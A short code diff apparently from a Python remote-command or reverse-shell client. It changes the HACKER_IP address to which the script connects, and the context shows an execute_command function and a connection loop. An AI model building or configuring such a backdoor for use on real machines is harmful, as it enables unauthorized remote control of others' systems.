@@ -131,7 +131,7 @@ def execute_command(cmd, conn):
         return f"Error: {str(e)}"
 
 def main():
-    HACKER_IP = "192.168.1.14"  # CHANGE THIS
+    HACKER_IP = "192.168.1.17"  # CHANGE THIS
     HACKER_PORT = 8008
 
     while True:
